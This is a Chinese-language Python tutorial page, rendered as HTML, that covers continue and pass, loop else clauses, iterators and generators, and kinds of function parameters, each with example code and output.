<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>:     <span class="comment"># 第一个实例</span></span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'o'</span>:        <span class="comment"># 字母为 o 时跳过输出</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母 :'</span>, letter)</span><br><span class="line"> </span><br><span class="line">var = <span class="number">10</span>                    <span class="comment"># 第二个实例</span></span><br><span class="line"><span class="keyword">while</span> var &gt; <span class="number">0</span>:              </span><br><span class="line">   var = var <span class="number">-1</span></span><br><span class="line">   <span class="keyword">if</span> var == <span class="number">5</span>:             <span class="comment"># 变量为 5 时跳过输出</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前变量值 :'</span>, var)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母 : R</span><br><span class="line">当前字母 : u</span><br><span class="line">当前字母 : n</span><br><span class="line">当前字母 : b</span><br><span class="line">当前变量值 : 9</span><br><span class="line">当前变量值 : 8</span><br><span class="line">当前变量值 : 7</span><br><span class="line">当前变量值 : 6</span><br><span class="line">当前变量值 : 4</span><br><span class="line">当前变量值 : 3</span><br><span class="line">当前变量值 : 2</span><br><span class="line">当前变量值 : 1</span><br><span class="line">当前变量值 : 0</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<p>循环语句可以有 else 子句，它在穷尽列表(以for循环)或条件变为 false (以while循环)导致循环终止时被执行,但循环被break终止时不执行。</p>
<p>如下实例用于查询质数的循环例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>, n):</span><br><span class="line">        <span class="keyword">if</span> n % x == <span class="number">0</span>:</span><br><span class="line">            print(n, <span class="string">'等于'</span>, x, <span class="string">'*'</span>, n//x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 循环中没有找到元素</span></span><br><span class="line">        print(n, <span class="string">' 是质数'</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2  是质数</span><br><span class="line">3  是质数</span><br><span class="line">4 等于 2 * 2</span><br><span class="line">5  是质数</span><br><span class="line">6 等于 2 * 3</span><br><span class="line">7  是质数</span><br><span class="line">8 等于 2 * 4</span><br><span class="line">9 等于 3 * 3</span><br></pre></td></tr></table></figure>
<h3 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h3><p>Python pass是空语句，是为了保持程序结构的完整性。</p>
<p>pass 不做任何事情，一般用做占位语句，如下实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># 等待键盘中断 (Ctrl+C)</span></span><br></pre></td></tr></table></figure>
<p>最小的类:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmptyClass</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>以下实例在字母为 o 时 执行 pass 语句块:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>: </span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'o'</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">print</span> (<span class="string">'执行 pass 块'</span>)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母 :'</span>, letter)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母 : R</span><br><span class="line">当前字母 : u</span><br><span class="line">当前字母 : n</span><br><span class="line">执行 pass 块</span><br><span class="line">当前字母 : o</span><br><span class="line">执行 pass 块</span><br><span class="line">当前字母 : o</span><br><span class="line">当前字母 : b</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>

<h2 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代是Python最强大的功能之一，是访问集合元素的一种方式。</p>
<p>迭代器是一个可以记住遍历的位置的对象。</p>
<p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p>
<p>迭代器有两个基本的方法：iter() 和 next()。</p>
<p>字符串，列表或元组对象都可用于创建迭代器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"><span class="keyword">print</span> (next(it))</span><br><span class="line"><span class="keyword">print</span> (next(it))</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%BF%AD%E4%BB%A3%E5%99%A8.PNG" alt="迭代器"><br>迭代器对象可以使用常规for语句进行遍历：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">list=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">print</span> (x, end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/for%E8%BF%AD%E4%BB%A3.PNG" alt="for迭代"><br>也可以使用 next() 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys         <span class="comment"># 引入 sys 模块</span></span><br><span class="line"> </span><br><span class="line">list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (next(it))</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/next.PNG" alt="使用next函数"></p>
<h3 id="创建一个迭代器"><a href="#创建一个迭代器" class="headerlink" title="创建一个迭代器"></a>创建一个迭代器</h3><p>把一个类作为一个迭代器使用需要在类中实现两个方法 <strong>iter</strong>() 与 <strong>next</strong>() 。</p>
<p>如果你已经了解的面向对象编程，都支持类都有一个构造函数，Python 的构造函数为 <strong>init</strong>(), 它会在对象初始化的时候执行。</p>
<p><strong>iter</strong>() 方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 <strong>next</strong>() 方法并通过 StopIteration 异常标识迭代的完成。</p>
<p><strong>next</strong>() 方法（Python 2 里是 next()）会返回下一个迭代器对象。</p>
<p>创建一个返回数字的迭代器，初始值为 1，逐步递增 1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNumbers</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">    x = self.a</span><br><span class="line">    self.a += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<h3 id="StopIteration"><a href="#StopIteration" class="headerlink" title="StopIteration"></a>StopIteration</h3><p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 <strong>next</strong>() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。</p>
<p>在 20 次迭代后停止执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNumbers</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.a &lt;= <span class="number">20</span>:</span><br><span class="line">      x = self.a</span><br><span class="line">      self.a += <span class="number">1</span></span><br><span class="line">      <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> StopIteration</span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> myiter:</span><br><span class="line">  print(x)</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>在 Python 中，使用了 yield 的函数被称为生成器（generator）。</p>
<p>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。</p>
<p>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</p>
<p>调用一个生成器函数，返回的是一个迭代器对象。</p>
<p>以下实例使用 yield 实现斐波那契数列：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span> <span class="comment"># 生成器函数 - 斐波那契</span></span><br><span class="line">    a, b, counter = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (counter &gt; n): </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">f = fibonacci(<span class="number">10</span>) <span class="comment"># f 是一个迭代器，由生成器返回生成</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (next(f), end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<p>执行以上程序，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 1 1 2 3 5 8 13 21 34 55</span><br></pre></td></tr></table></figure>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。</p>
<p>函数能提高应用的模块性，和代码的重复利用率。你已经知道Python提供了许多内建函数，比如print()。但你也可以自己创建函数，这被叫做用户自定义函数。</p>
<h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><p>你可以定义一个由自己想要功能的函数，以下是简单的规则：<br>· 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 ()。<br>· 任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。<br>· 函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。<br>· 函数内容以冒号起始，并且缩进。<br>· return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Python 定义函数使用 def 关键字，一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名（参数列表）:</span></span><br><span class="line">    函数体</span><br></pre></td></tr></table></figure>
<p>默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>定义一个函数：给了函数一个名称，指定了函数里包含的参数，和代码块结构。</p>
<p>这个函数的基本结构完成以后，你可以通过另一个函数调用执行，也可以直接从 Python 命令提示符执行。</p>
<p>如下实例调用了 printme() 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">printme(<span class="string">"我要调用用户自定义函数!"</span>)</span><br><span class="line">printme(<span class="string">"再次调用同一函数"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我要调用用户自定义函数!</span><br><span class="line">再次调用同一函数</span><br></pre></td></tr></table></figure>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 python 中，类型属于对象，变量是没有类型的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">a=<span class="string">"Runoob"</span></span><br></pre></td></tr></table></figure>
<p>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p>
<h3 id="mutable-与不可更改-immutable-对象"><a href="#mutable-与不可更改-immutable-对象" class="headerlink" title="(mutable)与不可更改(immutable)对象"></a>(mutable)与不可更改(immutable)对象</h3><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>
<pre><code>·`不可变类型`：变量赋值 a=5 后再赋值 a=10，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。

·`可变类型`：变量赋值 la=[1,2,3,4] 后再赋值 la[2]=5 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</code></pre><p>python 函数的参数传递：</p>
<pre><code>·`不可变类型`：类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。

·`可变类型`：类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</code></pre><p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p>
<h4 id="python-传不可变对象实例"><a href="#python-传不可变对象实例" class="headerlink" title="python 传不可变对象实例"></a>python 传不可变对象实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span><span class="params">( a )</span>:</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line">print( b ) <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure>
<p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p>
<h4 id="传可变对象实例"><a href="#传可变对象实例" class="headerlink" title="传可变对象实例"></a>传可变对象实例</h4><p>可变对象在函数里修改了参数，那么在调用这个函数的函数里，原始的参数也被改变了。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span><span class="params">( mylist )</span>:</span></span><br><span class="line">   <span class="string">"修改传入的列表"</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"函数内取值: "</span>, mylist)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外取值: "</span>, mylist)</span><br></pre></td></tr></table></figure>
<p>传入函数的和在末尾添加新内容的对象用的是同一个引用。故输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内取值:  [10, 20, 30, [1, 2, 3, 4]]</span><br><span class="line">函数外取值:  [10, 20, 30, [1, 2, 3, 4]]</span><br></pre></td></tr></table></figure>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>以下是调用函数时可使用的正式参数类型：</p>
<pre><code>·必需参数
·关键字参数
·默认参数
·不定长参数</code></pre><h4 id="必需参数"><a href="#必需参数" class="headerlink" title="必需参数"></a>必需参数</h4><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
<p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    printme()</span><br><span class="line">TypeError: printme() missing <span class="number">1</span> required positional argument: <span class="string">'str'</span></span><br></pre></td></tr></table></figure>
<h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
<p>以下实例在函数 printme() 调用时使用参数名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme( str = <span class="string">"菜鸟教程"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure>
<p>以下实例中演示了函数参数的使用不需要使用指定顺序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( name, age )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"名字: "</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"年龄: "</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">"runoob"</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">名字:  runoob</span><br><span class="line">年龄:  50</span><br></pre></td></tr></table></figure>
<h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( name, age = <span class="number">35</span> )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"名字: "</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"年龄: "</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">"runoob"</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"------------------------"</span>)</span><br><span class="line">printinfo( name=<span class="string">"runoob"</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">名字:  runoob</span><br><span class="line">年龄:  50</span><br><span class="line">------------------------</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  35</span><br></pre></td></tr></table></figure>
<h4 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h4><p>你可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述 2 种参数不同，声明时不会命名。基本语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionname</span><span class="params">([formal_args,] *var_args_tuple )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure>
<p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">print</span> (vartuple)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出: </span><br><span class="line">70</span><br><span class="line">(60, 50)</span><br></pre></td></tr></table></figure>
<p>如果在函数调用时没有指定参数，它就是一个空元组。我们也可以不向函数传递未命名的变量。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, *vartuple )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="keyword">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出:</span><br><span class="line">10</span><br><span class="line">输出:</span><br><span class="line">70</span><br><span class="line">60</span><br><span class="line">50</span><br></pre></td></tr></table></figure>
<p>还有一种就是参数带两个星号 <code>**</code> 基本语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionname</span><span class="params">([formal_args,] **var_args_dict )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure>
<p>加了两个星号 <code>**</code> 的参数会以字典的形式导入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( arg1, **vardict )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的参数"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"输出: "</span>)</span><br><span class="line">   <span class="keyword">print</span> (arg1)</span><br><span class="line">   <span class="keyword">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo(<span class="number">1</span>, a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出: </span><br><span class="line">1</span><br><span class="line">&#123;&#39;a&#39;: 2, &#39;b&#39;: 3&#125;</span><br></pre></td></tr></table></figure>
<p>声明函数时，参数中星号 <code>*</code> 可以单独出现，例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a,b,*,c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br></pre></td></tr></table></figure>
<p>如果单独出现星号 * 后的参数必须用关键字传入。</p>
